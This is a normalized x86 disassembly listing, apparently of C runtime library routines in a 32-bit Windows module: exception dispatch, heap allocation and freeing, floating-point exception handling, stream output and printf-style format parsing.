mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x18 ]
mov [ ebx - 0x4 ] eax
mov eax [ ebx + 0xc ]
mov [ ebp - 0x8 ] eax
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push esi
mov ecx ebx
mov edx 0xfffffffe
call sub_1004598b
lea eax [ eax + eax * 2 ]
lea eax [ eax + 0x4 ]
mov ecx [ edi + eax * 4 + 0x4 ]
lea eax [ edi + eax * 4 ]
mov ebx [ eax ]
mov [ ebp - 0x10 ] eax
test ecx ecx
je r-xdata
mov edx [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ edx + esi ]
call sub_1003c623
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_1003c623
mov cl [ ebp - 0x1 ]
mov edx esi
call sub_10045942
mov cl 0x1
mov [ ebp - 0x1 ] cl
test eax eax
js r-xdata
test cl cl
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jle r-xdata
jmp r-xdata
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
mov [ ebp - 0x8 ] ebx
mov eax ebx
cmp ebx 0xfffffffe
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
call sub_10045972
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x8 ]
cmp [ eax + 0xc ] edx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ edi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push esi
mov ecx eax
call sub_1004598b
mov eax [ ebp + 0xc ]
push r--data
call sub_10045400
add esp 0x4
test eax eax
je r-xdata
mov eax [ edi + 0x8 ]
mov ecx [ edi + 0xc ]
add ecx esi
xor ecx [ eax + esi ]
call sub_1003c623
mov ecx [ ebp - 0x10 ]
mov edx esi
mov ecx [ ecx + 0x8 ]
call sub_10045959
int3
jmp r-xdata
push 0x1
push [ ebp + 0x8 ]
call [ r--data ]
add esp 0x8
mov ecx [ edi + 0x4 ]
add ecx esi
xor ecx [ eax + esi ]
call sub_1003c623
sub_1003f393
call sub_100454f1
test eax eax
je r-xdata
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1004551a
pop ecx
push 0x3
call sub_1003ee86
int3
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push 0x1
push 0x40000015
push 0x3
call sub_1003fccb
add esp 0xc
push 0x7
pop ecx
int 0x29
sub_1003f3e3
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
test eax eax
jne r-xdata
push esi
call sub_100417ee
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_10041801
pop ecx
mov [ esi ] eax
pop esi
sub_1003f43d
push edx
fwait
fnstcw [ esp ]
mov eax [ esp + 0xc ]
je r-xdata
test eax 0xfffff
jne r-xdata
cmp [ esp ] 0x27f
je r-xdata
call sub_10045d5c
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
test eax 0x80000000
jne r-xdata
call sub_10045d45
cmp [ rw-data ] 0x0
jne r-xdata
and eax 0x80000000
je r-xdata
test eax 0x7ff00000
jne r-xdata
fsqrt
cmp [ esp ] 0x27f
je r-xdata
mov edx 0x5
lea ecx [ rw-data ]
call sub_10045ce7
pop edx
retn
cmp [ rw-data ] 0x0
jne r-xdata
fstp st0
fld [ r--data ]
mov eax 0x1
test eax 0xfffff
jne r-xdata
mov edx 0x5
lea ecx [ rw-data ]
jmp r-xdata
pop edx
retn
fldcw [ esp ]
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
jmp r-xdata
pop edx
retn
and ax 0x20
je r-xdata
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
call sub_10045ce7
pop edx
retn
sub_1003f4da
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fucom st1
fnstsw ax
push edi
test ah 0x44
jpe r-xdata
push esi
mov si [ ebp + 0xe ]
movzx eax si
test eax 0x7ff0
jne r-xdata
fstp st1
xor edi edi
jmp r-xdata
push 0x0
push ecx
fstp st0
push ecx
fstp [ esp ]
call sub_1003f5ac
movzx edi si
add esp 0xc
shr edi 0x4
and edi 0x7ff
sub edi 0x3fe
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
test ecx 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edi
pop edi
pop ebp
retn
fcompp
mov edi 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
test edx edx
je r-xdata
xor eax eax
xor eax eax
inc eax
jmp r-xdata
mov ecx 0xffef
and si cx
mov [ ebp + 0xe ] si
test eax eax
je r-xdata
add ecx ecx
mov [ ebp + 0xc ] ecx
test edx edx
jns r-xdata
test [ ebp + 0xe ] 0x10
jne r-xdata
fld [ ebp + 0x8 ]
push 0x0
push ecx
push ecx
fstp [ esp ]
call sub_1003f5ac
add esp 0xc
jmp r-xdata
mov eax 0x8000
or si ax
mov [ ebp + 0xe ] si
add edx edx
dec edi
test [ ebp + 0xe ] 0x10
je r-xdata
or ecx 0x1
mov [ ebp + 0xc ] ecx
pop esi
mov si [ ebp + 0xe ]
mov [ ebp + 0x8 ] edx
sub_1003f5ac
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xe ]
fld [ ebp + 0x8 ]
movzx eax ax
lea ecx [ ecx + 0x3fe ]
and eax 0x800f
shl ecx 0x4
fstp [ ebp - 0x8 ]
or ecx eax
mov [ ebp - 0x2 ] cx
fld [ ebp - 0x8 ]
mov esp ebp
pop ebp
retn
sub_1003f5db
push ebp
mov ebp esp
sub esp 0xc
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ebx
and esi 0x1f
test bl 0x8
je r-xdata
test bl 0x4
je r-xdata
test [ ebp + 0x10 ] 0x1
je r-xdata
test bl 0x1
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push 0x1
call sub_1003fb9e
pop ecx
and esi 0xfffffff7
jmp r-xdata
test bl 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1003fb9e
pop ecx
and esi 0xfffffffb
jmp r-xdata
test bl 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1003fb9e
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
mov esp ebp
pop ebp
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
push edi
xor edi edi
test bl 0x10
je r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1003fb9e
pop ecx
and esi 0xffffffef
mov ecx [ ebp + 0xc ]
fld [ ecx ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
inc edi
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
xor edi edi
inc edi
fld [ ecx ]
lea eax [ ebp + 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1003f4da
mov eax [ ebp + 0x8 ]
add esp 0xc
add eax 0xfffffa00
mov [ ebp + 0x8 ] eax
fst [ ebp - 0xc ]
fldz
cmp eax 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and esi 0xfffffffd
push 0x10
call sub_1003fb9e
pop ecx
fcompp
xor edx edx
fnstsw ax
test ah 0x41
jne r-xdata
xor edi edi
fmulp st1
inc edi
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
mov ecx [ ebp + 0xc ]
fldz
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
mov eax [ ebp - 0x6 ]
mov ecx 0xfffffc03
and eax 0xf
or eax 0x10
mov [ ebp - 0x6 ] ax
mov eax [ ebp + 0x8 ]
cmp eax ecx
jge r-xdata
inc edx
mov eax [ ebp + 0xc ]
fstp [ eax ]
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0xc ]
test edx edx
je r-xdata
sub ecx eax
mov eax [ ebp - 0xc ]
test edi edi
pop edi
je r-xdata
fchs
shr eax 0x1
test [ ebp - 0x8 ] 0x1
mov [ ebp - 0xc ] eax
je r-xdata
test edi edi
jne r-xdata
shr [ ebp - 0x8 ] 0x1
dec ecx
jne r-xdata
or eax 0x80000000
mov [ ebp - 0xc ] eax
inc edi
test [ ebp - 0xc ] 0x1
je r-xdata
sub_1003f7b9
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f7da
add esp 0x1c
pop ebp
retn
sub_1003f7da
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor ecx ecx
push ebx
xor ebx ebx
inc ebx
mov [ eax + 0x4 ] ecx
mov eax [ ebp + 0x8 ]
push edi
mov edi 0xc000000d
mov [ eax + 0x8 ] ecx
mov eax [ ebp + 0x8 ]
mov [ eax + 0xc ] ecx
mov ecx [ ebp + 0x10 ]
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008f
or [ eax + 0x4 ] ebx
test cl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000093
or [ eax + 0x4 ] 0x2
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000091
or [ eax + 0x4 ] 0x4
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc000008e
or [ eax + 0x4 ] 0x8
mov ecx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
shl eax 0x4
not eax
xor eax [ ecx + 0x8 ]
and eax 0x10
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
add eax eax
not eax
xor eax [ ecx + 0x8 ]
and eax 0x8
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x1
not eax
xor eax [ ecx + 0x8 ]
and eax 0x4
xor [ ecx + 0x8 ] eax
mov ecx [ ebp + 0x8 ]
mov eax [ esi ]
shr eax 0x3
not eax
xor eax [ ecx + 0x8 ]
and eax 0x2
xor [ ecx + 0x8 ] eax
mov eax [ esi ]
mov ecx [ ebp + 0x8 ]
shr eax 0x5
not eax
xor eax [ ecx + 0x8 ]
and eax ebx
xor [ ecx + 0x8 ] eax
call sub_1003fbf6
mov edx eax
test dl 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
mov edi 0xc0000090
or [ eax + 0x4 ] 0x10
test dl 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test dl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x8
test dl 0x10
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x4
test dl 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffeb
or eax 0x8
cmp eax 0x200
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffd
or eax ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx + 0x20 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x20 ] eax
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov ecx [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
mov eax [ ecx + 0x60 ]
and eax 0xffffffe3
or eax 0x2
mov [ ecx + 0x60 ] eax
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
mov eax [ ebp + 0x8 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0x1c ]
and [ eax + 0x60 ] 0xffffffe1
mov eax [ ebp + 0x8 ]
fld [ ebx ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xffffffe7
or eax 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ ecx ] eax
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
and eax 0xfffffffe
or eax 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1003fb62
lea eax [ ebp + 0x8 ]
push eax
push 0x1
push 0x0
push edi
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ ecx ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] 0x1
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
mov edx 0xfffff3ff
and eax 0x3
sub eax 0x0
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ ebx ]
fld [ ecx + 0x50 ]
fstp [ ebx ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] 0x0
pop esi
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax 0x0
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_1003fabf
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
cmp eax 0x1
je r-xdata
call sub_100417ee
mov [ eax ] 0x21
add eax 0xfffffffe
cmp eax 0x1
ja r-xdata
pop ebp
retn
call sub_100417ee
mov [ eax ] 0x22
pop ebp
retn
sub_1003faec
push 0x8
push r--data
call sub_1003f180
cmp [ rw-data ] 0x1
jl r-xdata
call sub_1003f1c5
retn
mov eax [ ebp + 0x8 ]
test al 0x40
je r-xdata
and eax 0xffffffbf
mov [ ebp + 0x8 ] eax
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_1003fb73
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
not ecx
and eax [ ebp + 0xc ]
and cx [ ebp - 0x4 ]
or cx ax
movzx eax cx
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
mov esp ebp
pop ebp
retn
sub_1003fb9e
push ebp
mov ebp esp
push ecx
push ecx
mov ecx [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
mov esp ebp
pop ebp
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_1003fc06
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp esi 0xffffffe0
ja r-xdata
push esi
call sub_1003fc98
pop ecx
call sub_100417ee
mov [ eax ] 0xc
xor eax eax
push ebx
push edi
test esi esi
je r-xdata
call sub_10045188
push 0x1e
call sub_100451e5
push 0xff
call sub_1003ecb4
xor ecx ecx
inc ecx
mov ecx esi
jmp r-xdata
mov eax edi
pop edi
pop ebx
jmp r-xdata
push 0xc
pop ebx
cmp [ rw-data ] eax
je r-xdata
push ecx
push 0x0
push eax
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop esi
pop ebp
retn
call sub_100417ee
mov [ eax ] ebx
push esi
call sub_1003fc98
pop ecx
test eax eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
jmp r-xdata
call sub_100417ee
mov [ eax ] ebx
sub_1003fc98
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1003fccb
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
cmp [ ebp + 0x8 ] 0xffffffff
push edi
je r-xdata
and [ ebp - 0x320 ] 0x0
lea eax [ ebp - 0x31c ]
push 0x4c
push 0x0
push eax
call sub_10045ec0
lea eax [ ebp - 0x320 ]
add esp 0xc
mov [ ebp - 0x328 ] eax
lea eax [ ebp - 0x2d0 ]
mov [ ebp - 0x324 ] eax
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x218 ] eax
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov eax [ eax - 0x4 ]
mov [ ebp - 0x21c ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0x320 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x31c ] eax
mov eax [ ebp + 0x4 ]
mov [ ebp - 0x314 ] eax
call [ IsDebuggerPresent@IAT ]
mov edi eax
lea eax [ ebp - 0x328 ]
push eax
call sub_10043515
pop ecx
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call sub_10045001
pop ecx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop edi
call sub_1003c623
mov esp ebp
pop ebp
retn
test edi edi
jne r-xdata
cmp [ ebp + 0x8 ] 0xffffffff
je r-xdata
push [ ebp + 0x8 ]
call sub_10045001
pop ecx
sub_1003fdfd
push ebp
mov ebp esp
push [ rw-data ]
call [ DecodePointer@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003fe38
int3
pop ebp
jmp eax
sub_1003fe38
push 0x17
call IsProcessorFeaturePresent
test eax eax
je r-xdata
push esi
push 0x1
mov esi 0xc0000417
push esi
push 0x2
call sub_1003fccb
push esi
call sub_10043500
add esp 0x10
pop esi
retn
push 0x5
pop ecx
int 0x29
sub_1003fe63
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
push edi
push esi
call sub_100460c6
pop ecx
mov ecx [ esi + 0xc ]
mov edi eax
test cl 0x82
jne r-xdata
test cl 0x40
je r-xdata
call sub_100417ee
mov [ eax ] 0x9
push ebx
xor ebx ebx
test cl 0x1
je r-xdata
call sub_100417ee
mov [ eax ] 0x22
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
mov [ esi + 0x4 ] ebx
or eax 0x2
mov [ esi + 0xc ] eax
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test cl 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
je r-xdata
call sub_10045fea
add eax 0x20
cmp esi eax
je r-xdata
or ecx 0x20
mov [ esi + 0xc ] ecx
jmp r-xdata
mov eax [ esi + 0x8 ]
and ecx 0xfffffffe
mov [ esi ] eax
mov [ esi + 0xc ] ecx
xor eax eax
inc eax
push eax
mov [ ebp + 0xc ] eax
lea eax [ ebp + 0x8 ]
push eax
push edi
call sub_1004613e
add esp 0xc
mov ebx eax
mov edx [ esi + 0x8 ]
mov ecx [ esi ]
sub ecx edx
mov [ ebp + 0xc ] ecx
lea eax [ edx + 0x1 ]
mov [ esi ] eax
mov eax [ esi + 0x18 ]
dec eax
mov [ esi + 0x4 ] eax
test ecx ecx
jle r-xdata
push edi
call sub_100460ea
pop ecx
test eax eax
jne r-xdata
call sub_10045fea
add eax 0x40
cmp esi eax
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax al
or [ esi + 0xc ] 0x20
cmp edi 0xffffffff
je r-xdata
push ecx
push edx
push edi
call sub_1004613e
add esp 0xc
mov ebx eax
jmp r-xdata
push esi
call sub_10046c01
pop ecx
pop ebx
mov ecx rw-data
cmp edi 0xfffffffe
je r-xdata
mov ecx [ esi + 0x8 ]
mov al [ ebp + 0x8 ]
mov [ ecx ] al
jmp r-xdata
push 0x2
push ebx
push ebx
push edi
call sub_10046a92
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax edi
mov ecx edi
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
cmp ebx [ ebp + 0xc ]
je r-xdata
test [ ecx + 0x4 ] 0x20
je r-xdata
sub_1003ffb2
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x270 ]
push ebx
push esi
mov [ ebp - 0x230 ] eax
mov eax [ ebp + 0xc ]
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x210 ] eax
xor eax eax
mov ebx eax
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x254 ] eax
mov esi eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x238 ] eax
call sub_1003cf9b
call sub_100417ee
mov [ ebp - 0x258 ] eax
mov eax [ ebp - 0x230 ]
test eax eax
je r-xdata
call sub_100417ee
mov [ eax ] 0x16
call sub_1003fe28
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
jne r-xdata
cmp [ ebp - 0x264 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
mov edx [ ebp - 0x210 ]
test edx edx
je r-xdata
push eax
call sub_100460c6
pop ecx
mov ecx eax
cmp ecx 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1003c623
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x268 ]
and [ ecx + 0x70 ] 0xfffffffd
mov dl [ edx ]
xor eax eax
mov [ ebp - 0x224 ] eax
mov ecx eax
mov [ ebp - 0x220 ] ecx
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x250 ] eax
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x248 ] dl
test dl dl
je r-xdata
mov edx rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax ecx
mov eax [ ebp - 0x210 ]
cmp ecx 0xffffffff
je r-xdata
mov edx ecx
sar eax 0x5
and edx 0x1f
shl edx 0x6
add edx [ eax * 4 + rw-data ]
jmp r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov ecx rw-data
cmp ecx 0xfffffffe
je r-xdata
test [ edx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov eax ecx
and ecx 0x1f
sar eax 0x5
shl ecx 0x6
add ecx [ eax * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x210 ]
jmp [ eax * 4 + jump_table_10040b12 ]
mov edi [ ebp - 0x244 ]
movsx edi [ edi + eax * 8 + r--data ]
mov eax edi
mov [ ebp - 0x244 ] edi
mov edi [ ebp - 0x21c ]
sar eax 0x4
mov [ ebp - 0x244 ] eax
cmp eax 0x7
ja r-xdata
test [ ecx + 0x24 ] 0x80
jne r-xdata
inc eax
mov [ ebp - 0x210 ] eax
test ecx ecx
js r-xdata
xor eax eax
or [ ebp - 0x228 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x24c ] eax
mov [ ebp - 0x240 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x238 ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
xor eax eax
mov [ ebp - 0x228 ] eax
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
xor eax eax
movsx eax dl
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
imul ecx [ ebp - 0x240 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x240 ] eax
test eax eax
jns r-xdata
imul ecx [ ebp - 0x228 ] 0xa
movsx eax dl
add ecx 0xffffffd0
add eax ecx
mov [ ebp - 0x228 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x228 ] eax
test eax eax
mov eax [ ebp - 0x210 ]
mov [ ebp - 0x21c ] edi
jns r-xdata
mov eax [ ebp - 0x210 ]
mov al [ eax ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x248 ]
call sub_10041746
add esp 0xc
jmp r-xdata
lea eax [ ebp - 0x220 ]
push eax
push [ ebp - 0x230 ]
push [ ebp - 0x248 ]
call sub_10041746
mov ecx [ ebp - 0x210 ]
add esp 0xc
mov al [ ecx ]
inc ecx
mov [ ebp - 0x248 ] al
mov [ ebp - 0x210 ] ecx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x218 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
mov ecx [ ebp - 0x220 ]
or ebx 0x4
neg eax
mov [ ebp - 0x218 ] ebx
mov [ ebp - 0x240 ] eax
jmp r-xdata
mov dl [ eax ]
mov [ ebp - 0x211 ] dl
mov [ ebp - 0x248 ] dl
test dl dl
jne r-xdata
or [ ebp - 0x228 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
mov edi [ ebp - 0x210 ]
cmp [ edi + 0x1 ] 0x34
jne r-xdata
or ebx 0x20
jmp r-xdata
mov eax [ ebp - 0x210 ]
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x218 ] ebx
cmp eax 0x53
